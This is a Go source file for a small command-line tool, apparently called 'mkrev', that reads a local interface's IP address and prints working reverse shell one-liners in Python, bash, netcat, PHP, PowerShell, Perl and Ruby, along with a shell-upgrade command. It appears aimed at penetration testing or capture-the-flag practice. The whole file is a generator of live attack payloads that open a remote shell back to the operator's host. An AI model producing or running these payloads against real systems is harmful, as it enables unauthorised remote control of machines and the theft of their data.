package main

import (
	"fmt"
	"net"
	"os"
)

const (
	// TODO: Add more variant (?)
	python     string = "py"
	bash       string = "bash"
	netcat     string = "nc"
	php        string = "php"
	powershell string = "ps"
	perl       string = "pl"
	ruby       string = "rb"
)

func main() {

	if len(os.Args) > 3 {
		interfaces := os.Args[1]
		port := os.Args[2]
		shell := os.Args[3]
		crafted := generateRShell(interfaces, port, shell)
		fmt.Println("[+] Shell:")
		fmt.Println(crafted)
		fmt.Println("[+] Upgrade shell:")
		fmt.Println("python3 -c 'import pty;pty.spawn(\"/bin/bash\")'")
		fmt.Println("export TERM=xterm")

		return
	}
	fmt.Printf("[-] Usage:\tmkrev [interface] [port] [shell]\n")
	fmt.Printf("[-] Example:\tmkrev tun0 9000 py\n")
	fmt.Printf("[-] Shells:\tpy, bash, nc, php, ps, pl, rb \n")
}

func generateRShell(interfaces, port, shell string) string {
	ip, ok := checkInterfaces(interfaces)
	if !ok {
		fmt.Println("[-] Error, invalid interface")
		os.Exit(1)
	}

	switch shell {
	case python:
		return fmt.Sprintf(`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`,
			ip, port)
	case bash:
		return fmt.Sprintf(`bash -c "bash -i >& /dev/tcp/%s/%s 0>&1"`, ip, port)
	case netcat:
		return fmt.Sprintf(`nc -e /bin/sh %s %s`, ip, port)
	case php:
		return fmt.Sprintf(`php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'`, ip, port)
	case powershell:
		return fmt.Sprintf(`$client = New-Object System.Net.Sockets.TCPClient("%s",%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`, ip, port)
	case perl:
		return fmt.Sprintf(`perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`, ip, port)
	case ruby:
		return fmt.Sprintf(`ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%%d >&%%d 2>&%%d",f,f,f)'`, ip, port)
	default:
		return fmt.Sprint("Me dumb :(")
	}
}
func checkInterfaces(name string) (string, bool) {
	listInterfaces, _ := net.Interfaces()

	for _, ifs := range listInterfaces {
		if name == ifs.Name {
			listAddr, _ := ifs.Addrs()
			ip := listAddr[0].String()
			return ip[:len(ip)-3], true
		}
		continue
	}
	return "", false
}
